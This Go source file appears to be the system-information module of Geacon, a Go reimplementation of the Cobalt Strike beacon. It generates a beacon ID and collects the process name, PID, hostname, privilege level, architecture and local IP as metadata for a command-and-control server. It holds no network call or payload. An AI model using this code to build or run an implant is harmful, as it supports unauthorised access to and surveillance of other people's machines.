package sysinfo

import (
	"encoding/binary"
	"main/util"
	"net"
	"os"
	"runtime"
	"strings"
)

const (
	ProcessArch86      = 0
	ProcessArch64      = 1
	ProcessArchIA64    = 2
	ProcessArchUnknown = 3
)

var ANSICodePage uint32

func GeaconID() int {
	randomInt := util.RandomInt(100000, 999998)
	if randomInt%2 == 0 {
		return randomInt
	} else {
		return randomInt + 1
	}
}

func GetProcessName() string {
	// argv[0] sometime is null, use os.Executable() instead
	// https://stackoverflow.com/questions/37211638/why-argv-in-createprocess-is-different-from-normal-c-program
	// but it can't explain why my `cmd.exe`+`/C cmdline` and `null`+`cmdline` fail to get argv[0]
	processName, err := os.Executable()
	if err != nil {
		return "unknown"
	}
	var result string
	processName = strings.ReplaceAll(processName, "\\", "/")
	// C:\Users\admin\Desktop\cmd.exe
	// ./cmd
	backslashPos := strings.LastIndex(processName, "/")
	if backslashPos > 0 {
		result = processName[backslashPos+1:]
	}
	return result
}

func GetPID() int {
	pid := os.Getpid()
	//util.Println(util.Sprintf("Pid: %d", pid))
	return pid
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size

	if runtime.GOOS == "linux" {
		sHostName = sHostName + "(Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + "(Darwin)"
	}
	return sHostName
}

func GetMetaDataFlag() byte {
	// there is no need to add 1 when process is x86, or it will make server discard some message
	flagInt := byte(0)
	if IsHighPriv() {
		flagInt += 8
	}
	if IsOSX64() {
		flagInt += 4
	}
	if IsProcessX64() {
		flagInt += 2
	}
	return flagInt
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && !strings.HasPrefix(ipnet.IP.String(), "169.254") && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return ""
}

func GetLocalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && !strings.HasPrefix(ipnet.IP.String(), "169.254") && ipnet.IP.To4() != nil {
			if len(ipnet.IP) == 16 {
				return binary.LittleEndian.Uint32(ipnet.IP[12:16])
			}
			return binary.LittleEndian.Uint32(ipnet.IP)
		}
	}
	return 0
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
